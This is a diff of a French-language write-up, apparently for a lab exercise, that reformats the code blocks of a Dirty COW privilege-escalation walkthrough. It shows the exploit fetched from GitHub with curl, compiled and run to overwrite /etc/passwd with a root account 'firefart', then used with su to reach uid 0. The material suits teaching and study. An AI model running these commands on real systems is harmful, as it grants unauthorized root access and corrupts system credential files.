@@ -19,31 +19,33 @@ Les étapes suivantes sont reprises dans le script2.sh.
 Nous téléchargons un script via _curl_ avec l'option _-O_ permettant de rediriger vers un fichier.
 Ensuite nous compilons et lançons ce script avec un argument afin de choisir un nouveau mot de passe.
 
-    $> curl -O https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
-    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                    Dload   Upload  Total   Spent    Left  Speed
-    100  4815  100  4815    0     0  23803      0 --:--:-- --:--:-- --:--:-- 31266
-    $> gcc -pthread dirty.c -o dirty -lcrypt
-    $> ./dirty "petdefeu"
-    /etc/passwd successfully backed up to /tmp/passwd.bak
-    Please enter the new password: petdefeu
-    Complete line:
-    firefart:trzgUrWEhLNPY:0:0:pwned:/root:/bin/bash
+```
+$> curl -O https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                Dload   Upload  Total   Spent    Left  Speed
+100  4815  100  4815    0     0  23803      0 --:--:-- --:--:-- --:--:-- 31266
+$> gcc -pthread dirty.c -o dirty -lcrypt
+$> ./dirty "petdefeu"
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: petdefeu
+Complete line:
+firefart:trzgUrWEhLNPY:0:0:pwned:/root:/bin/bash
 
-    mmap: b7fda000
-    madvise 0
+mmap: b7fda000
+madvise 0
 
-    ptrace 0
-    Done! Check /etc/passwd to see if the new user was created.
-    You can log in with the username 'firefart' and the password 'petdefeu'.
-
-
-    DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
-    Done! Check /etc/passwd to see if the new user was created.
-    You can log in with the username 'firefart' and the password 'petdefeu'.
+ptrace 0
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password 'petdefeu'.
 
 
-    DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+Done! Check /etc/passwd to see if the new user was created.
+You can log in with the username 'firefart' and the password 'petdefeu'.
+
+
+DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+```
 
 # Explications
 
@@ -79,12 +81,16 @@ La fonction `pid_t  fork(void);` est utilisé afin de créer un nouveau processu
 
 Le script script2.sh termine en se connectant en `firefart` donc le nouveau _super-user_
 
-    $> su firefart
-    Password:
-    
+```bash
+$> su firefart
+Password:
+``` 
+
 On peut verifier que nous avons tous les droits en tapant la commande `id`:
 
-    $> id
-    uid=0(firefart) gid=0(root) groups=0(root)
+```bash
+$> id
+uid=0(firefart) gid=0(root) groups=0(root)
+```
 
 __Bravo ! Vous êtes root !__
